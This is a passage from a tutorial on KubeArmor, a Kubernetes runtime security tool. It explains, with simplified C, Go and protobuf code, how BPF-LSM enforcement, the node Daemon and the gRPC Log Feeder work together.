  get_outer_key(&okey, t); // Helper to get PidNS+MntNS

  // Look up the container's rules map using Namespace IDs
  u32 *inner_map_fd = bpf_map_lookup_elem(&kubearmor_containers, &okey);

  if (!inner_map_fd) {
    return ret; // No rules for this container, allow by default
  }

  // Get the program's path (simplified)
  struct path f_path = BPF_CORE_READ(bprm->file, f_path);
  char path[256];
  // Simplified path reading logic...
  bpf_probe_read_str(path, sizeof(path), /* path pointer */);

  // Look up the rule for this path in the inner map (conceptually)
  // struct data_t *rule = bpf_map_lookup_elem(inner_map_fd, &path); // Conceptually

  struct data_t *rule = /* Simplified: simulate lookup */ NULL; // Replace with actual map lookup

  // Decision logic based on rule and event type (BPF_CORE_READ bprm->file access mode)
  if (rule && (rule->processmask & RULE_EXEC)) {
      if (rule->processmask & RULE_DENY) {
          // Match found and action is DENY, block the execution
          // Report event (simplified out)
          return -EPERM; // Block
      }
      // Match found and action is ALLOW (or AUDIT), allow execution
      // Report event (if AUDIT) (simplified out)
      return ret; // Allow
  }

  // No specific DENY rule matched. Check default posture (simplified)
  u32 default_posture = /* Look up default posture in another map */ 0; // 0 for Allow

  if (default_posture == BLOCK_POSTURE) {
      // Default is BLOCK, block the execution
      // Report event (simplified out)
      return -EPERM; // Block
  }

  return ret; // Default is ALLOW or no default, allow
}
```

**Explanation:**

* `struct outer_key`: Defines the key structure for the outer map (`kubearmor_containers`), using `pid_ns` and `mnt_ns` from the process's identity.
* `kubearmor_containers`: A BPF map storing references to other maps (or rule data directly in simpler cases), allowing rules to be organized per container/namespace.
* `SEC("lsm/bprm_check_security")`: Attaches this program to the LSM hook that is called before a new program is executed.
* `BPF_PROG(...)`: Macro defining the BPF program function.
* `get_outer_key`: Helper function to get the Namespace IDs for the current task.
* `bpf_map_lookup_elem(&kubearmor_containers, &okey)`: Looks up the map (or data) associated with the current process's namespace IDs.
* The core logic involves reading event data (like the program path), looking up the corresponding rule in the BPF maps, and returning `0` to allow or `-EPERM` to block, based on the rule's `action` flag (`RULE_DENY`).
* Events are also reported to the ring buffer (`kubearmor_events`) for logging, similar to the monitoring path.

On the Go side, the BPF-LSM Runtime Enforcer component loads these programs and, crucially, populates the BPF Maps with the translated policies.

```go
// Simplified Go code for loading BPF enforcement objects and populating maps (part of bpflsm/enforcer.go)

type BPFEnforcer struct {
    // ... other fields ...
    objs enforcerObjects // Holds loaded BPF programs and maps
    // ... other fields ...
}

// NewBPFEnforcer Function (simplified)
func NewBPFEnforcer(...) (*BPFEnforcer, error) {
    be := &BPFEnforcer{}

    // Load the compiled BPF code (.o file) containing programs and map definitions
    objs := enforcerObjects{} // enforcerObjects corresponds to maps and programs in the BPF .o file
    if err := loadEnforcerObjects(&objs, nil); err != nil {
        return nil, fmt.Errorf("failed to load BPF objects: %w", err)
    }
    be.objs = objs // Store loaded objects

    // Attach programs to LSM hooks
    // The AttachLSM call links the BPF program to the kernel hook
    // be.objs.EnforceProc refers to the BPF program defined with SEC("lsm/bprm_check_security")
    link, err := link.AttachLSM(link.LSMOptions{Program: objs.EnforceProc})
    if err != nil {
        objs.Close()
        return nil, fmt.Errorf("failed to attach BPF program to LSM hook: %w", err)
    }
    // be.links = append(be.links, link) // Store link to manage it later (simplified)

    // Get references to the BPF maps defined in the C code
    // "kubearmor_containers" matches the map name in the BPF C code
    be.BPFContainerMap = objs.KubearmorContainers

    // ... Attach other programs (file, network, capabilities) ...
    // ... Setup ring buffer for alerts (like in monitoring) ...

    return be, nil
}

// AddContainerPolicies Function (simplified - conceptual)
func (be *BPFEnforcer) AddContainerPolicies(containerID string, pidns, mntns uint32, policies []tp.SecurityPolicy) error {
    // Translate KubeArmor policies (tp.SecurityPolicy) into a format
    // suitable for BPF map lookup (e.g., map of paths -> rule flags)
    // translatedRules := translatePoliciesToBPFRules(policies)

    // Create or get a reference to an inner map for this container (using BPF_MAP_TYPE_HASH_OF_MAPS)
    // The key for the outer map is the container's Namespace IDs
    outerKey := struct{ PidNS, MntNS uint32 }{pidns, mntns}

    // Conceptually:
    // innerMap, err := bpf.CreateMap(...) // Create inner map if it doesn't exist
    // err = be.BPFContainerMap.Update(outerKey, uint32(innerMap.FD()), ebpf.UpdateAny) // Link outer key to inner map FD

    // Populate the inner map with the translated rules
    // for path, ruleFlags := range translatedRules {
    //     ruleData := struct{ ProcessMask, FileMask uint8 }{...} // Map ruleFlags to data_t
    //     err = innerMap.Update(path, ruleData, ebpf.UpdateAny)
    // }

    // Simplified Update (directly indicating container exists with rules)
    containerMapValue := uint32(1) // Placeholder value
    if err := be.BPFContainerMap.Update(outerKey, containerMapValue, ebpf.UpdateAny); err != nil {
         return fmt.Errorf("failed to update BPF container map: %w", err)
    }


    be.Logger.Printf("Loaded BPF-LSM policies for container %s (pidns:%d, mntns:%d)", containerID, pidns, mntns)
    return nil
}
```

**Explanation:**

* `loadEnforcerObjects`: Loads the compiled BPF enforcement code.
* `link.AttachLSM`: Attaches a specific BPF program (`objs.EnforceProc`) to a named kernel LSM hook (`lsm/bprm_check_security`).
* `be.BPFContainerMap = objs.KubearmorContainers`: Gets a handle (reference) to the BPF map defined in the C code. This handle allows the Go program to interact with the map in the kernel.
* `AddContainerPolicies`: This conceptual function shows how KubeArmor translates high-level policies into a kernel-friendly format (e.g., flags like `RULE_DENY`, `RULE_EXEC`) and uses `BPFContainerMap.Update` to populate the maps. The Namespace IDs (`pidns`, `mntns`) are used as keys to ensure policies are applied to the correct container context.

This illustrates how KubeArmor uses user-space code to set up the BPF environment in the kernel, loading programs and populating maps. Once this is done, the BPF programs handle enforcement decisions directly within the kernel when events occur.

## BPF Components Overview

BPF technology involves several key components:

| Component        | Description                                                                 | Where it runs                                       | KubeArmor Usage                                                         |
| ---------------- | --------------------------------------------------------------------------- | --------------------------------------------------- | ----------------------------------------------------------------------- |
| **BPF Programs** | Small, safe programs written in a C-like language, compiled to BPF bytecode | Kernel                                              | Monitor events, Enforce policies at hooks                               |
| **BPF Hooks**    | Specific points in the kernel where BPF programs can be attached            | Kernel                                              | Entry/exit of syscalls, tracepoints, LSM hooks                          |
| **BPF Maps**     | Efficient key-value data structures for sharing data                        | Kernel (accessed by both kernel BPF and user space) | Store policy rules, Store event data (ring buffer), Store identity info |
| **BPF Verifier** | Kernel component that checks BPF programs for safety before loading         | Kernel                                              | Ensures KubeArmor's BPF programs are safe                               |
| **BPF JIT**      | Compiles BPF bytecode to native machine code for performance                | Kernel                                              | Makes KubeArmor's BPF operations fast                                   |
| **BPF Loader**   | User-space library/tool to compile C code, load programs/maps into kernel   | User Space                                          | KubeArmor Daemon uses `cilium/ebpf` library as loader                   |

## Conclusion

In this chapter, you've taken a deeper dive into BPF (eBPF), the powerful kernel technology that forms the backbone of KubeArmor's runtime security capabilities. You learned how eBPF enables KubeArmor to run small, safe, high-performance programs inside the kernel for both observing system events (System Monitor) and actively enforcing security policies at low level hooks (Runtime Enforcer via BPF-LSM). You saw how BPF Maps are used to share data and store policy rules efficiently in the kernel.

Understanding BPF highlights KubeArmor's modern, efficient approach to container and node security. In the next chapter, we'll bring together all the components we've discussed by looking at the central orchestrator on each node

# KubeArmor Daemon

Welcome back to the KubeArmor tutorial! In our journey so far, we've explored the key components that make KubeArmor work:

* Security Policies: Your rulebooks for security.
* Container/Node Identity: How KubeArmor knows *who* is doing something.
* Runtime Enforcer: The component that translates policies into kernel rules and blocks forbidden actions.
* System Monitor: KubeArmor's eyes and ears, observing system events.
* BPF (eBPF): The powerful kernel technology powering much of the monitoring and enforcement.

In this chapter, we'll look at the **KubeArmor Daemon**. If the other components are like specialized tools or senses, the KubeArmor Daemon is the **central brain and orchestrator** that lives on each node. It brings all these pieces together, allowing KubeArmor to function as a unified security system.

## What is the KubeArmor Daemon?

The KubeArmor Daemon is the main program that runs on every node (Linux server) where you want KubeArmor to provide security. When you install KubeArmor, you typically deploy it as a DaemonSet in Kubernetes, ensuring one KubeArmor Daemon pod runs on each of your worker nodes. If you're using KubeArmor outside of Kubernetes (on a standalone Linux server or VM), the daemon runs directly as a system service.

Think of the KubeArmor Daemon as the **manager** for that specific node. Its responsibilities include:

* **Starting and stopping** all the other KubeArmor components (System Monitor, Runtime Enforcer, Log Feeder).
* **Communicating** with external systems like the Kubernetes API server or the container runtime (Docker, containerd, CRI-O) to get information about running workloads and policies.
* **Building and maintaining** the internal mapping for Container/Node Identity.
* **Fetching and processing** Security Policies (KSP, HSP, CSP) that apply to the workloads on its node.
* **Instructing** the Runtime Enforcer on which policies to load and enforce for specific containers and the host.
* **Receiving** security events and raw data from the System Monitor.
* **Adding context** (like identity) to raw events received from the monitor.
* **Forwarding** processed logs and alerts to the Log Feeder for external consumption.
* **Handling configuration changes** and responding to shutdown signals.

Without the Daemon, the individual components couldn't work together effectively to provide end-to-end security.

## Why is the Daemon Needed? A Coordinated Use Case

Let's trace the journey of a security policy and a system event, highlighting the Daemon's role.

Imagine you want to protect a specific container, say a database pod with label `app: my-database`, by blocking it from executing the `/bin/bash` command. You create a KubeArmor Policy (KSP) like this:

```yaml
# Simplified KSP
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: block-bash-in-db
  namespace: default
spec:
  selector:
    matchLabels:
      app: my-database
  process:
    matchPaths:
      - path: /bin/bash
  action: Block
```

And let's say later, a process inside that database container actually attempts to run `/bin/bash`.

Here's how the KubeArmor Daemon on the node hosting that database pod orchestrates the process:

1. **Policy Discovery:** The KubeArmor Daemon, which is watching the Kubernetes API server, detects your new `block-bash-in-db` policy.
2. **Identify Targets:** The Daemon processes the policy's `selector` (`app: my-database`). It checks its internal state (built by talking to the Kubernetes API and container runtime) to find which running containers/pods on *its* node match this label. It identifies the specific database container.
3. **Prepare Enforcement:** The Daemon takes the policy rule (`Block /bin/bash`) and tells its **Runtime Enforcer** component to load this rule specifically for the identified database container. The Enforcer translates this into the format needed by the underlying OS security module (AppArmor, SELinux, or BPF-LSM) and loads it into the kernel.
4. **System Event:** A process inside the database container tries to execute `/bin/bash`.
5. **Event Detection & Enforcement:** The OS kernel intercepts this action. If using BPF-LSM, the **Runtime Enforcer**'s BPF program checks the loaded policy rules (which the Daemon put there). It sees the rule to `Block` `/bin/bash` for this container's identity. The action is immediately blocked by the kernel.
6. **Event Monitoring & Context:** Simultaneously, the **System Monitor**'s BPF programs also detect the `exec` attempt on `/bin/bash`. It collects details like the process ID, the attempted command, and the process's Namespace IDs. It sends this raw data to the Daemon (via a BPF ring buffer).
7. **Event Processing:** The Daemon receives the raw event from the Monitor. It uses the Namespace IDs to look up the Container/Node Identity in its internal map, identifying that this event came from the database container (`app: my-database`). It sees the event includes an error code indicating it was blocked by the security module.
8. **Log Generation:** The Daemon formats a detailed log/alert message containing all the information: the event type (process execution), the command (`/bin/bash`), the outcome (Blocked), and the workload identity (container ID, Pod Name, Namespace, Labels).
9. **Log Forwarding:** The Daemon sends this formatted log message to its **Log Feeder** component, which then forwards it to your configured logging/monitoring system.

![](https://900196120-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MPsOItOtXvqxa1thD0e%2Fuploads%2Fgit-blob-0913432427f1d838171729b8aba7d92876a9d90d%2Fkubearmor_daemon.png?alt=media)

This diagram illustrates how the Daemon acts as the central point, integrating information flow and control between external systems (K8s, CRI), the low-level kernel components (Monitor, Enforcer), and the logging/alerting system.

## The Daemon Structure

Let's look at the core structure representing the KubeArmor Daemon in the code. It holds references to all the components it manages and the data it needs.

Referencing `KubeArmor/core/kubeArmor.go`:

```go
// KubeArmorDaemon Structure (Simplified)
type KubeArmorDaemon struct {
 // node information
 Node     tp.Node
 NodeLock *sync.RWMutex

 // flag
 K8sEnabled bool

 // K8s pods, containers, endpoints, owner info
 // These map identity details collected from K8s/CRI
 K8sPods     []tp.K8sPod
 K8sPodsLock *sync.RWMutex
 Containers     map[string]tp.Container
 ContainersLock *sync.RWMutex
 EndPoints     []tp.EndPoint
 EndPointsLock *sync.RWMutex
 OwnerInfo map[string]tp.PodOwner

 // Security policies watched from K8s API
 SecurityPolicies     []tp.SecurityPolicy
 SecurityPoliciesLock *sync.RWMutex
 HostSecurityPolicies     []tp.HostSecurityPolicy
 HostSecurityPoliciesLock *sync.RWMutex

 // logger component
 Logger *fd.Feeder

 // system monitor component
 SystemMonitor *mon.SystemMonitor

 // runtime enforcer component
 RuntimeEnforcer *efc.RuntimeEnforcer

 // Used for managing background goroutines
 WgDaemon sync.WaitGroup

 // ... other fields for health checks, state agent, etc. ...
}
```

**Explanation:**

* The `KubeArmorDaemon` struct contains fields like `Node` (details about the node it runs on), `K8sEnabled` (whether it's in a K8s cluster), and maps/slices to store information about `K8sPods`, `Containers`, `EndPoints`, and parsed `SecurityPolicies`. Locks (`*sync.RWMutex`) are used to safely access this shared data from multiple parts of the Daemon's logic.
* Crucially, it has pointers to the other main components: `Logger`, `SystemMonitor`, and `RuntimeEnforcer`. This shows that the Daemon *owns* and interacts with instances of these components.
* `WgDaemon` is a `sync.WaitGroup` used to track background processes (goroutines) started by the Daemon, allowing for a clean shutdown.

## Daemon Lifecycle: Initialization and Management

When KubeArmor starts on a node, the `KubeArmor()` function in `KubeArmor/main.go` (which calls into `KubeArmor/core/kubeArmor.go`) initializes and runs the Daemon.

Here's a simplified look at the initialization steps within the `KubeArmor()` function:

```go
// KubeArmor Function (Simplified)
func KubeArmor() {
 // create a daemon instance
 dm := NewKubeArmorDaemon()
 // dm is our KubeArmorDaemon object on this node

 // ... Node info setup (whether in K8s or standalone) ...

 // initialize log feeder component
 if !dm.InitLogger() {
  // handle error and destroy daemon
  return
 }
 dm.Logger.Print("Initialized KubeArmor Logger")

 // Start logger's background process to serve feeds
 go dm.ServeLogFeeds()

 // ... StateAgent, Health Server initialization ...

 // initialize system monitor component
 if cfg.GlobalCfg.Policy || cfg.GlobalCfg.HostPolicy { // Only if policy/hostpolicy is enabled
  if !dm.InitSystemMonitor() {
   // handle error and destroy daemon
   return
  }
  dm.Logger.Print("Initialized KubeArmor Monitor")

  // Start system monitor's background processes to trace events
  go dm.MonitorSystemEvents()

  // initialize runtime enforcer component
  // It receives the SystemMonitor instance because the BPF enforcer
  // might need info from the monitor (like pin paths)
  if !dm.InitRuntimeEnforcer(dm.SystemMonitor.PinPath) {
   dm.Logger.Print("Disabled KubeArmor Enforcer since No LSM is enabled")
  } else {
   dm.Logger.Print("Initialized KubeArmor Enforcer")
  }

  // ... Presets initialization ...
 }

 // ... K8s/CRI specific watching for Pods/Containers/Policies ...

 // wait for a while (initialization sync)

 // ... Policy and Pod watching (K8s specific) ...

 // listen for interrupt signals to trigger shutdown
 sigChan := GetOSSigChannel()
 <-sigChan // This line blocks until a signal is received

 // destroy the daemon (calls Close methods on components)
 dm.DestroyKubeArmorDaemon()
}

// NewKubeArmorDaemon Function (Simplified)
func NewKubeArmorDaemon() *KubeArmorDaemon {
 dm := new(KubeArmorDaemon)
 // Initialize maps, slices, locks, and component pointers to nil/empty
 dm.NodeLock = new(sync.RWMutex)
 dm.K8sPodsLock = new(sync.RWMutex)
 dm.ContainersLock = new(sync.RWMutex)
 dm.EndPointsLock = new(sync.RWMutex)
 dm.SecurityPoliciesLock = new(sync.RWMutex)
 dm.HostSecurityPoliciesLock = new(sync.RWMutex)
 dm.DefaultPosturesLock = new(sync.Mutex)
 dm.ActivePidMapLock = new(sync.RWMutex)
 dm.MonitorLock = new(sync.RWMutex)

 dm.Containers = map[string]tp.Container{}
 dm.EndPoints = []tp.EndPoint{}
 dm.OwnerInfo = map[string]tp.PodOwner{}
 dm.DefaultPostures = map[string]tp.DefaultPosture{}
 dm.ActiveHostPidMap = map[string]tp.PidMap{}
 // Pointers to components (Logger, Monitor, Enforcer) are initially nil
 return dm
}

// InitSystemMonitor Function (Called by Daemon)
func (dm *KubeArmorDaemon) InitSystemMonitor() bool {
    // Create a new SystemMonitor instance, passing it data it needs
 dm.SystemMonitor = mon.NewSystemMonitor(
        &dm.Node, &dm.NodeLock, // Node info
        dm.Logger, // Reference to the logger
        &dm.Containers, &dm.ContainersLock, // Container identity info
        &dm.ActiveHostPidMap, &dm.ActivePidMapLock, // Host process identity info
        &dm.MonitorLock, // Monitor's own lock
    )
 if dm.SystemMonitor == nil {
  return false
 }

    // Initialize BPF inside the monitor
 if err := dm.SystemMonitor.InitBPF(); err != nil {
  return false
 }
 return true
}

// InitRuntimeEnforcer Function (Called by Daemon)
func (dm *KubeArmorDaemon) InitRuntimeEnforcer(pinpath string) bool {
    // Create a new RuntimeEnforcer instance, passing it data/references
 dm.RuntimeEnforcer = efc.NewRuntimeEnforcer(
        dm.Node, // Node info
        pinpath, // BPF pin path from the monitor
        dm.Logger, // Reference to the logger
        dm.SystemMonitor, // Reference to the monitor (for BPF integration needs)
    )
 return dm.RuntimeEnforcer != nil
}
```

**Explanation:**

* `NewKubeArmorDaemon` is like the constructor; it creates the Daemon object and initializes its basic fields and locks. Pointers to components like `Logger`, `SystemMonitor`, `RuntimeEnforcer` are initially zeroed.
* The main `KubeArmor()` function then *calls* dedicated `Init...` methods on the `dm` object (like `dm.InitLogger()`, `dm.InitSystemMonitor()`, `dm.InitRuntimeEnforcer()`).
* These `Init...` methods are responsible for creating the actual instances of the other components using their respective `New...` functions (e.g., `mon.NewSystemMonitor()`) and assigning the returned object to the Daemon's pointer field (`dm.SystemMonitor = ...`). They pass necessary configuration and references (like the `Logger`) to the components they initialize.
* After initializing components, the Daemon starts goroutines (using `go dm.SomeFunction()`) for tasks that need to run continuously in the background, like serving logs, monitoring system events, or watching external APIs.
* The main flow then typically waits for a shutdown signal (`<-sigChan`).
* When a signal is received, `dm.DestroyKubeArmorDaemon()` is called, which in turn calls `Close...` methods on the components to shut them down gracefully.

This demonstrates the Daemon's role in the lifecycle: it's the entity that brings the other parts to life, wires them together by passing references, starts their operations, and orchestrates their shutdown.

## Daemon as the Information Hub

The Daemon isn't just starting components; it's managing the flow of information:

1. **Policies In:** The Daemon actively watches the Kubernetes API (or receives updates in non-K8s mode) for changes to KubeArmor policies. When it gets a policy, it stores it in its `SecurityPolicies` or `HostSecurityPolicies` lists and notifies the Runtime Enforcer to update the kernel rules for affected workloads.
2. **Identity Management:** The Daemon watches Pod/Container/Node events from Kubernetes and the container runtime. It populates internal structures (like the `Containers` map) which are then used by the System Monitor to correlate raw kernel events with workload identity (Container/Node Identity). While the `NsMap` itself might live in the Monitor (as seen in Chapter 4 context), the Daemon is responsible for gathering the initial K8s/CRI data needed to *populate* that map.
3. **Events Up:** The System Monitor constantly reads raw event data from the kernel (via BPF ring buffer). It performs the initial lookup using the Namespace IDs and passes the enriched events (likely via Go channels, as hinted in Chapter 4 code) back *to* the Daemon or a component managed by the Daemon (like the logging pipeline within the Feeder).
4. **Logs Out:** The Daemon (or its logging pipeline) takes these enriched events and passes them to the Log Feeder component. The Log Feeder is then responsible for sending these logs/alerts to the configured output destinations.

The Daemon acts as the central switchboard, ensuring that policies are delivered to the enforcement layer, that kernel events are enriched with workload context, and that meaningful security logs and alerts are generated and sent out.

## Daemon Responsibilities Summary

| Responsibility           | What it Does                                                                                         | Interacts With                                                        |
| ------------------------ | ---------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------- |
| **Component Management** | Starts, stops, and manages the lifecycle of Monitor, Enforcer, Logger.                               | System Monitor, Runtime Enforcer, Log Feeder                          |
| **External Comm.**       | Watches K8s API for policies & workload info; interacts with CRI.                                    | Kubernetes API Server, Container Runtimes (Docker, containerd, CRI-O) |
| **Identity Building**    | Gathers data (Labels, Namespaces, Container IDs, PIDs, NS IDs) to map low-level events to workloads. | Kubernetes API Server, Container Runtimes, OS Kernel (`/proc`)        |
| **Policy Processing**    | Fetches policies, identifies targeted workloads on its node.                                         | Kubernetes API Server, Internal state (Identity)                      |
| **Enforcement Orchest.** | Tells the Runtime Enforcer which policies to load for which workload.                                | Runtime Enforcer, Internal state (Identity, Policies)                 |
| **Event Reception**      | Receives raw or partially processed events from the Monitor.                                         | System Monitor (via channels/buffers)                                 |
| **Event Enrichment**     | Adds full workload identity and policy context to incoming events.                                   | System Monitor, Internal state (Identity, Policies)                   |
| **Logging/Alerting**     | Formats events into structured logs/alerts and passes them to the Log Feeder.                        | Log Feeder, Internal state (Enriched Events)                          |
| **Configuration/Signal** | Reads configuration, handles graceful shutdown requests.                                             | Configuration files/API, OS Signals                                   |

This table reinforces that the Daemon is the crucial integration layer on each node.

## Conclusion

In this chapter, you learned that the KubeArmor Daemon is the core process running on each node, serving as the central orchestrator for all other KubeArmor components. It's responsible for initializing, managing, and coordinating the System Monitor (eyes/ears), Runtime Enforcer (security guard), and Log Feeder (reporter). You saw how it interacts with Kubernetes and container runtimes to understand Container/Node Identity and fetch Security Policies, bringing all the pieces together to enforce your security posture and report violations.

Understanding the Daemon's central role is key to seeing how KubeArmor operates as a cohesive system on each node. In the final chapter, we'll focus on where all the security events observed by the Daemon and its components end up

# Log Feeder

Welcome back to the KubeArmor tutorial! In the previous chapters, we've learned how KubeArmor defines security rules using Security Policies, identifies workloads using Container/Node Identity, enforces policies with the Runtime Enforcer, and observes system activity with the System Monitor, all powered by the underlying BPF (eBPF) technology and orchestrated by the KubeArmor Daemon on each node.

We've discussed how KubeArmor can audit or block actions based on policies. But where do you actually *see* the results of this monitoring and enforcement? How do you know when a policy was violated or when suspicious activity was detected?

This is where the **Log Feeder** comes in.

## What is the Log Feeder?

Think of the Log Feeder as KubeArmor's **reporting and alerting system**. Its primary job is to collect all the security-relevant events and telemetry that KubeArmor detects and make them available to you and other systems.

It receives structured information, including:

* **Security Alerts:** Notifications about actions that were audited or blocked because they violated a Security Policy.
* **System Logs:** Telemetry about system activities that KubeArmor is monitoring, even if no specific policy applies (e.g., process executions, file accesses, network connections, depending on visibility settings).
* **KubeArmor Messages:** Internal messages from the KubeArmor Daemon itself (useful for debugging and monitoring KubeArmor's status).

The Log Feeder formats this information into standardized messages (using **Protobuf**, a language-neutral, platform-neutral, extensible mechanism for serializing structured data) and sends it out over a **gRPC** interface. gRPC is a high-performance framework for inter-process communication.

This gRPC interface allows various clients to connect to the KubeArmor Daemon on each node and subscribe to streams of these security events in real-time. Tools like `karmor log` (part of the KubeArmor client tools) connect to this feeder to display events. External systems like Security Information and Event Management (SIEM) platforms can also integrate by writing clients that understand the KubeArmor gRPC format.

## Why is Log Feeding Important? Your Window into Security

You've deployed KubeArmor and applied policies. Now you need to answer questions like:

* Was that attempt to read `/etc/passwd` from the web server container actually blocked?
* Is any process on my host nodes trying to access sensitive files like `/root/.ssh`?
* Are my applications spawning unexpected shell processes, even if they aren't explicitly blocked by policy?
* Did KubeArmor successfully apply the policies I created?

The Log Feeder provides the answers by giving you a stream of events directly from KubeArmor:

* It reports when an action was **Blocked** by a specific policy, providing details about the workload and the attempted action.
* It reports when an action was **Audited**, showing you potentially suspicious behavior even if it wasn't severe enough to block.
* It reports general **System Events** (logs), giving you visibility into the normal or unusual behavior of processes, file accesses, and network connections on your nodes and within containers.

Without the Log Feeder, KubeArmor would be enforcing policies blindly from a monitoring perspective. You wouldn't have the necessary visibility to understand your security posture, detect attacks (even failed ones), or troubleshoot policy issues.

**Use Case Example:** You want to see every time someone tries to execute a shell (`/bin/sh`, `/bin/bash`) inside any of your containers. You might create an Audit Policy for this. The Log Feeder is how you'll receive the notifications for these audited events.

## How the Log Feeder Works (High-Level)

1. **Event Source:** The System Monitor observes kernel events (process execution, file access, etc.). It enriches these events with Container/Node Identity and sends them to the KubeArmor Daemon. The Runtime Enforcer also contributes by confirming if an event was blocked or audited by policy.
2. **Reception by Daemon:** The KubeArmor Daemon receives these enriched events.
3. **Formatting (by Feeder):** The Daemon passes the event data to the Log Feeder component. The Feeder takes the structured event data and converts it into the predefined **Protobuf** message format (e.g., `Alert` or `Log` message types defined in `protobuf/kubearmor.proto`).
4. **Queueing:** The Feeder manages internal queues or channels for different types of messages (Alerts, Logs, general KubeArmor Messages). It puts the newly formatted Protobuf message onto the appropriate queue/channel.
5. **gRPC Server:** The Feeder runs a gRPC server on a specific port (default 32767).
6. **Client Subscription:** External clients connect to this gRPC port and call specific gRPC methods (like `WatchAlerts` or `WatchLogs`) to subscribe to event streams.
7. **Event Streaming:** When a client subscribes, the Feeder gets a handle to the client's connection. It then continuously reads messages from its internal queues/channels and streams them over the gRPC connection to the connected client.

Here's a simple sequence diagram showing the flow:

![](https://900196120-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MPsOItOtXvqxa1thD0e%2Fuploads%2Fgit-blob-5e56f6291b1d3f63a73e30ad91d0cec264e09a7b%2Flog_feeder.png?alt=media)

This shows how events flow from the kernel, up through the System Monitor and Daemon, are formatted by the Log Feeder, and then streamed out to any connected clients.

## Looking at the Code (Simplified)

The Log Feeder is implemented primarily in `KubeArmor/feeder/feeder.go` and `KubeArmor/feeder/logServer.go`, using definitions from `protobuf/kubearmor.proto` and the generated `protobuf/kubearmor_grpc.pb.go`.

First, let's look at the Protobuf message structures. These define the schema for the data that gets sent out.

Referencing `protobuf/kubearmor.proto`:

```protobuf
// Simplified Protobuf definition for an Alert message
message Alert {
  int64 Timestamp = 1;
  string UpdatedTime = 2;
  string ClusterName = 3;
  string HostName = 4;
  string NamespaceName = 5;
  Podowner Owner = 31; // Link to PodOwner struct
  string PodName = 6;
  string Labels = 29;

  string ContainerID = 7;
  string ContainerName = 8;
  string ContainerImage = 24;

  // Process details (host/container PIDs, names, UID)
  int32 HostPPID = 27;
  int32 HostPID = 9;
  int32 PPID = 10;
  int32 PID = 11;
  int32 UID = 12;
  string ParentProcessName = 25;
  string ProcessName = 26;

  // Policy/Enforcement details
  string PolicyName = 13;
  string Severity = 14;
  string Tags = 15; // Comma separated tags from policy
  repeated string ATags = 30; // Tags as a list

  string Message = 16; // High-level description
  string Type = 17; // e.g., MatchedPolicy, MatchedHostPolicy, SystemEvent
  string Source = 18; // e.g., /bin/bash
  string Operation = 19; // e.g., Process, File, Network
  string Resource = 20; // e.g., /etc/passwd, tcp://1.2.3.4:80
  string Data = 21; // Additional data if any
  string Enforcer = 28; // e.g., BPFLSM, AppArmor, eBPF Monitor
  string Action = 22; // e.g., Allow, Audit, Block
  string Result = 23; // e.g., Failed, Passed, Error

  // Context details
  string Cwd = 32; // Current working directory
  string TTY = 33; // TTY information

  // Throttling info (for alerts)
  int32 MaxAlertsPerSec = 34;
  int32 DroppingAlertsInterval = 35;

  ExecEvent ExecEvent = 36; // Link to ExecEvent struct

  // ... other fields
}

// Simplified Protobuf definition for a Log message (similar but fewer policy fields)
message Log {
  int64 Timestamp = 1;
  string UpdatedTime = 2;
  // ... similar identity/process fields as Alert ...
  string Type = 13; // e.g., ContainerLog, HostLog
  string Source = 14;
  string Operation = 15;
  string Resource = 16;
  string Data = 17;
  string Result = 18; // e.g., Success, Failed

  string Cwd = 25;
  string TTY = 26;

  ExecEvent ExecEvent = 27;
}

// Simplified definitions for nested structs
message Podowner {
  string Ref = 1;
  string Name = 2;
  string Namespace = 3;
}

message ExecEvent {
  string ExecID = 1;
  string ExecutableName = 2;
}
```

These Protobuf definitions specify the exact structure and data types for the messages KubeArmor will send, ensuring that clients know exactly what data to expect. The `.pb.go` and `_grpc.pb.go` files are automatically generated from this `.proto` file and provide the Go code for serializing/deserializing these messages and implementing the gRPC service.

Now, let's look at the Log Feeder implementation in Go.

Referencing `KubeArmor/feeder/feeder.go`:

```go
// NewFeeder Function (Simplified)
func NewFeeder(node *tp.Node, nodeLock **sync.RWMutex) *Feeder {
 fd := &Feeder{}

 // Initialize data structures to hold connection channels
 fd.EventStructs = &EventStructs{
  MsgStructs: make(map[string]EventStruct[pb.Message]),
  MsgLock:    sync.RWMutex{},
  AlertStructs: make(map[string]EventStruct[pb.Alert]),
  AlertLock:  sync.RWMutex{},
  LogStructs: make(map[string]EventStruct[pb.Log]),
  LogLock:    sync.RWMutex{},
 }

 // Configure and start the gRPC server
 fd.Port = fmt.Sprintf(":%s", cfg.GlobalCfg.GRPC) // Get port from config
 listener, err := net.Listen("tcp", fd.Port)
 if err != nil {
  kg.Errf("Failed to listen a port (%s, %s)", fd.Port, err.Error())
  return nil // Handle error
 }
 fd.Listener = listener

 // Create the gRPC server instance
 logService := &LogService{
  QueueSize:    1000, // Define queue size for client channels
  Running:      &fd.Running,
  EventStructs: fd.EventStructs, // Pass the connection store
 }
 fd.LogServer = grpc.NewServer(/* ... gRPC server options ... */)

 // Register the LogService implementation with the gRPC server
 pb.RegisterLogServiceServer(fd.LogServer, logService)

 // ... other initialization ...

 return fd
}

// ServeLogFeeds Function (Called by the Daemon)
func (fd *BaseFeeder) ServeLogFeeds() {
 fd.WgServer.Add(1)
 defer fd.WgServer.Done()

 // This line blocks forever, serving gRPC requests until Listener.Close() is called
 if err := fd.LogServer.Serve(fd.Listener); err != nil {
  kg.Print("Terminated the gRPC service")
 }
}

// PushLog Function (Called by the Daemon/System Monitor)
func (fd *Feeder) PushLog(log tp.Log) {
    // ... code to process the incoming internal log struct (tp.Log) ...

    // Convert the internal log struct (tp.Log) into the Protobuf Log or Alert struct (pb.Log/pb.Alert)
 // This involves mapping fields like ContainerID, ProcessName, Resource, Action, PolicyName etc.
    // The logic checks the type and fields to decide if it's an Alert or a general Log

 if log.Type == "MatchedPolicy" || log.Type == "MatchedHostPolicy" || log.Type == "SystemEvent" {
        // It's a security alert type of event
  pbAlert := pb.Alert{}
        // Copy fields from internal log struct to pbAlert struct
  pbAlert.Timestamp = log.Timestamp
        // ... copy other fields like ContainerID, PolicyName, Action, Resource ...

        // Broadcast the pbAlert to all connected clients watching alerts
  fd.EventStructs.AlertLock.Lock() // Lock for safe concurrent access
  defer fd.EventStructs.AlertLock.Unlock()
  for uid := range fd.EventStructs.AlertStructs {
   select {
